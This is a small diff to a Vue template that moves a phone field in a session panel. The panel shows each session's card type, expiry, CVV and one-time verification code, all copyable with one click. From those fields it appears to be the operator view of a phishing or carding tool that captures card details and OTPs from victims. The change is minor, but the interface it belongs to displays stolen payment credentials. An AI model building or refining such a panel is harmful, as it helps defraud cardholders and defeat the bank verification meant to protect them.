@@ -36,6 +36,7 @@ function copy(val: string) {
 
 <template>
   <div class="session-fields" v-if="group==='card'">
+    <div class="field" v-if="customerInfo.phone && !hidePhone" @click="copy(customerInfo.phone)"><label>电话：</label><span class="value">{{ customerInfo.phone }}</span></div>
     <div class="field field-wide" v-if="cardInfo.cardType" @click="copy(cardInfo.cardType)">
       <label>卡类型：</label>
       <span class="value card-type-badge" :style="{ color: cardIcon.color, borderColor: cardIcon.color }">
@@ -51,7 +52,6 @@ function copy(val: string) {
     <div class="field" v-if="cardInfo.expiry" @click="copy(cardInfo.expiry)"><label>有效期：</label><span class="value">{{ cardInfo.expiry }}</span></div>
     <div class="field" v-if="cardInfo.cvv" @click="copy(cardInfo.cvv)"><label>CVV：</label><span class="value">{{ cardInfo.cvv }}</span></div>
     <div class="field" v-if="cardInfo.otpCode" @click="copy(cardInfo.otpCode)"><label>验证码：</label><span class="value value-orange">{{ cardInfo.otpCode }}</span></div>
-    <div class="field" v-if="customerInfo.phone && !hidePhone" @click="copy(customerInfo.phone)"><label>电话：</label><span class="value">{{ customerInfo.phone }}</span></div>
   </div>
 
   <div class="session-fields" v-else-if="group==='address' && !hideAddress">
